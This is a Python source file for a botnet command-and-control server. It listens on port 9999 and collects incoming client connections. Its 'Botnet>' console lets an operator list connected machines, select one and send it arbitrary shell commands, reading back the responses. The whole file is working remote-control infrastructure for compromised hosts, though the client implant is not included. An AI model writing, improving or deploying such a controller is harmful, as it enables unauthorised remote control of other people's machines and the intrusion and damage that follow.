import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_addresses = []

motd = '''
list - Shows available connections
select - Selects a client by its index.
quit - Terminates connection with a client.
shutdown - closes the botnet.
    '''


# https://stackoverflow.com/questions/7749341/basic-python-client-socket-example
# https://stackoverflow.com/questions/12362542/python-server-only-one-usage-of-each-socket-address-is-normally-permitted
# Create socket that allows clients to connect
def socket_create():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))
        sys.exit(1)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)


# Bind socket to port (the host and port the communication will take place) and wait for connection from client
def socket_bind():
    try:
        global host
        global port
        global s
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
        time.sleep(5)
        socket_bind()


# Puts IPs to list
def reset_connections():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_addresses[:]
    while 1:
        try:
            conn, address = s.accept()
            conn.setblocking(1)
            all_connections.append(conn)
            all_addresses.append(address)
            print("Connection has been established | " + "IP " + address[0] + " | Port " + str(address[1]))
        except socket.error as msg:
            print("Reset connections error: " + str(msg))


# ---------------------------------------------------------


# Menu to send commands
def interact():
    while 1:
        cmd = input('Botnet> ')
        if cmd == 'shutdown':
            queue.task_done()
            queue.task_done()
            print('Server shutdown')
            sys.exit(0)
        elif cmd == 'list':
            print('----- Connections -----')
            for address in all_addresses:
                print(str(all_addresses.index(address) + 1) + '   ' + str(address[0]) + '   ' + str(address[1]))
            print('')
            continue
        elif 'select' in cmd:
            target = cmd.replace('select ', '')
            target = int(target) - 1
            conn = all_connections[target]
            print("You are now connected to " + str(all_addresses[target][0]))
            print(str(all_addresses[target][0]) + '> ', end="")
            while True:
                try:
                    cmd = input()
                    if cmd == 'quit':
                        break
                    if len(str.encode(cmd)) > 0:
                        conn.send(str.encode(cmd))
                        client_response = str(conn.recv(1024), "utf-8")
                        print(client_response, end="")
                except:
                    print("Connection was lost")
                    break
        elif cmd == '':
            pass
        else:
            print('Command not recognized')


# ---------------------------------------------------------


# Create worker threads (will die when main exits)
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


# Do the next job in the queue
def work():
    while 1:
        x = queue.get()
        if x == 1:
            socket_create()
            socket_bind()
            reset_connections()
        if x == 2:
            interact()
        queue.task_done()


# Each list item is a new job
def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()


print(motd)
create_workers()
create_jobs()
